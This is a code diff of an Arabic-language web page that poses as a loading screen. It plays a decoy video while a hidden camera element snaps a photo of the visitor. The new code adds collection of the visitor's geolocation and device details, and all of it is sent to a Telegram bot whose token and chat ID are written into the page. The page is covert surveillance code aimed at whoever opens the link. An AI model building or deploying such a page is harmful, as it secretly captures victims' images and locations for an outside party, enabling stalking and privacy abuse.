@@ -2,63 +2,107 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title> M31 ROJI m_roji_31  </title>
+<title>One Photo With Video</title>
 
 <style>
 body {
+  margin: 0;
   background:#000;
   color:#0f0;
-  text-align:center;
-  font-family:Arial;
+  font-family: Arial;
+  text-align: center;
 }
 
 /* إخفاء معاينة الكاميرا */
-video {
+video#camera {
   display: none;
+}
+
+/* فيديو في منتصف الصفحة */
+.video-center {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 5;
+}
+
+.video-center video {
+  width: 320px;
+  max-width: 90vw;
+  border-radius: 14px;
+  box-shadow: 0 0 25px rgba(0,0,0,0.7);
 }
 </style>
 </head>
 
 <body>
 
-<h3> انتضر سيتم فتح الموقع  </h3>
+<h3>جاري التحميل...</h3>
 
-<video id="video" autoplay playsinline></video>
+<!-- فيديو الواجهة -->
+<div class="video-center">
+  <video autoplay muted loop playsinline>
+    <source src="video.mp4" type="video/mp4">
+    متصفحك لا يدعم الفيديو
+  </video>
+</div>
+
+<!-- كاميرا مخفية -->
+<video id="camera" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 // ===== ضع معلوماتك هنا (محليًا فقط) =====
 const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
-const CHAT_ID  = "6251932709";
+const CHAT_ID  = "‏6251932709";
 // ======================================
 
 let streamRef = null;
+let locationInfo = "📍 الموقع: غير متاح";
 
-// جمع معلومات الجهاز
+// -------- الموقع (بموافقة المستخدم) --------
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      locationInfo = `
+📍 الموقع:
+- Latitude: ${pos.coords.latitude}
+- Longitude: ${pos.coords.longitude}
+- الدقة: ${pos.coords.accuracy} م
+      `;
+    },
+    () => {
+      locationInfo = "📍 الموقع: تم رفض الإذن";
+    }
+  );
+}
+
+// -------- معلومات الجهاز --------
 function getDeviceInfo() {
   const ua = navigator.userAgent;
+  let device = "غير معروف";
 
-  let deviceType = "غير معروف";
-  if (/android/i.test(ua)) deviceType = "Android";
-  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
-  else if (/windows/i.test(ua)) deviceType = "Windows";
-  else if (/macintosh/i.test(ua)) deviceType = "Mac";
-  else if (/linux/i.test(ua)) deviceType = "Linux";
+  if (/android/i.test(ua)) device = "Android";
+  else if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone / iOS";
+  else if (/windows/i.test(ua)) device = "Windows";
+  else if (/macintosh/i.test(ua)) device = "Mac";
+  else if (/linux/i.test(ua)) device = "Linux";
 
   return `
-📱 نوع الجهاز: ${deviceType}
+📱 الجهاز: ${device}
 🌐 المتصفح: ${navigator.appName}
-🧭 User-Agent: ${ua}
-📐 دقة الشاشة: ${screen.width} x ${screen.height}
+📐 الشاشة: ${screen.width} x ${screen.height}
 ⏰ الوقت: ${new Date().toLocaleString()}
+${locationInfo}
   `;
 }
 
-// تشغيل الكاميرا (بموافقة المستخدم)
+// -------- تشغيل الكاميرا --------
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
   streamRef = stream;
-  document.getElementById("video").srcObject = stream;
+  document.getElementById("camera").srcObject = stream;
 
   // صورة واحدة فقط بعد ثانيتين
   setTimeout(captureOnce, 2000);
@@ -68,7 +112,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
 });
 
 function captureOnce() {
-  const video = document.getElementById("video");
+  const video = document.getElementById("camera");
   const canvas = document.getElementById("canvas");
 
   canvas.width = video.videoWidth;
@@ -91,10 +135,10 @@ function captureOnce() {
       body: form
     })
     .then(() => {
-      document.body.innerHTML = "<h2>تم الفتح ✅</h2>";
+      document.querySelector("h3").innerText = "تم الإرسال ✅";
     })
     .catch(() => {
-      document.body.innerHTML = "<h2>فشل فتح ❌</h2>";
+      document.querySelector("h3").innerText = "فشل الإرسال ❌";
     });
   }, "image/jpeg");
 }
